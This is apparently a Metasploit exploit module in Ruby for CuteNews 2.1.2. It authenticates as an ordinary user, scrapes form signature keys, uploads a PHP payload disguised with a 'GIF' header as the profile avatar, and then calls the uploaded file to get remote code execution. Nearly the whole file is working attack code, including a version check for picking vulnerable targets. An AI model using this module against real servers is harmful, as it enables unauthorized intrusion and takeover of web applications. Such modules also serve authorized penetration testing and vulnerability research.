##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => "CuteNews 2.1.2 - 'avatar' Remote Code Execution",
      'Description' => %q(
        This module exploits a command execution vulnerability in CuteNews prior to 2.1.2.
        The attacker can infiltrate the server through the avatar upload process in the profile area.
        There is no realistic control of the $imgsize function in "/core/modules/dashboard.php"
        Header content of the file can be changed and the control can be bypassed.
        We can use the "GIF" header for this process.
        An ordinary user is enough to exploit the vulnerability. No need for admin user.
        The module creates a file for you and allows RCE.
      ),
      'License' => MSF_LICENSE,
      'Author' =>
        [
          'AkkuS <Özkan Mustafa Akkuş>', # Discovery & PoC & Metasploit module
        ],
      'References' =>
        [
          ['URL', 'http://pentest.com.tr/exploits/CuteNews-2-1-2-Remote-Code-Execution-Metasploit.html'],
          ['URL', 'http://cutephp.com'] # Official Website
        ],
      'Platform' => 'php',
      'Arch' => ARCH_PHP,
      'Targets' => [['Automatic', {}]],
      'Privileged' => false,
      'DisclosureDate' => "Apr 14 2019",
      'DefaultTarget' => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, "Base CutePHP directory path", '/CuteNews']),
        OptString.new('USERNAME', [true, "Username to authenticate with", 'admin']),
        OptString.new('PASSWORD', [false, "Password to authenticate with", 'admin'])
      ]
    )
  end

  def exec
    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path, "uploads","avatar_#{datastore['USERNAME']}_#{@shell}") # shell url
    })
  end
##
# Login and cookie information gathering
##

  def login(uname, pass, check)
    # 1st request to get cookie
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'vars_post' => {
        'action' => 'dologin',
        'username' => uname,
        'password' => pass
      }
    )

    cookie = res.get_cookies
    # 2nd request to cookie validation
    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path, "index.php"),
      'cookie'   => cookie
    })

    if res.code = 200 && (res.body =~ /dashboard/)
      return cookie
    end

    fail_with(Failure::NoAccess, "Authentication was unsuccessful with user: #{uname}")
    return nil
  end

  def peer
    "#{ssl ? 'https://' : 'http://' }#{rhost}:#{rport}"
  end
##
# Upload malicious file // payload integration
##
  def upload_shell(cookie, check)

    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path, "index.php?mod=main&opt=personal"),
      'cookie'   => cookie
    })

    signkey = res.body.split('__signature_key" value="')[1].split('"')[0]
    signdsi = res.body.split('__signature_dsi" value="')[1].split('"')[0]
    # data preparation
    fname = Rex::Text.rand_text_alpha_lower(8) + ".php"
    @shell = "#{fname}"
    pdata = Rex::MIME::Message.new
    pdata.add_part('main', nil, nil, 'form-data; name="mod"')
    pdata.add_part('personal', nil, nil, 'form-data; name="opt"')
    pdata.add_part("#{signkey}", nil, nil, 'form-data; name="__signature_key"')
    pdata.add_part("#{signdsi}", nil, nil, 'form-data; name="__signature_dsi"')
    pdata.add_part('', nil, nil, 'form-data; name="editpassword"')
    pdata.add_part('', nil, nil, 'form-data; name="confirmpassword"')
    pdata.add_part("#{datastore['USERNAME']}", nil, nil, 'form-data; name="editnickname"')
    pdata.add_part("GIF\r\n" + payload.encoded, 'image/png', nil, "form-data; name=\"avatar_file\"; filename=\"#{fname}\"")
    pdata.add_part('', nil, nil, 'form-data; name="more[site]"')
    pdata.add_part('', nil, nil, 'form-data; name="more[about]"')
    data = pdata.to_s

    res = send_request_cgi({
      'method' => 'POST',
      'data'  => data,
      'agent' => 'Mozilla',
      'ctype' => "multipart/form-data; boundary=#{pdata.bound}",
      'cookie' => cookie,
      'uri' => normalize_uri(target_uri.path, "index.php")
    })

    if res && res.code == 200 && res.body =~ /User info updated!/
      print_status("Trying to upload #{fname}")
      return true
    else
      fail_with(Failure::NoAccess, 'Error occurred during uploading!')
      return false
    end

  end
##
# Exploit controls and information
##
  def exploit
    unless Exploit::CheckCode::Vulnerable == check
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
    end

    cookie = login(datastore['USERNAME'], datastore['PASSWORD'], false)
    print_good("Authentication was successful with user: #{datastore['USERNAME']}")

    if upload_shell(cookie, true)
      print_good("Upload successfully.")
      exec
    end
  end
##
# Version and Vulnerability Check
##
  def check

    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path, "index.php")
    })

    unless res
      vprint_error 'Connection failed'
      return CheckCode::Unknown
    end

    if res.code == 200
      version = res.body.split('target="_blank">CuteNews ')[1].split('</a>')[0]
      if version < '2.1.3'
       print_status("#{peer} - CuteNews is #{version}")
       return Exploit::CheckCode::Vulnerable
      end
    end

    return Exploit::CheckCode::Safe
  end
end
##
# The end of the adventure (o_O) // AkkuS
##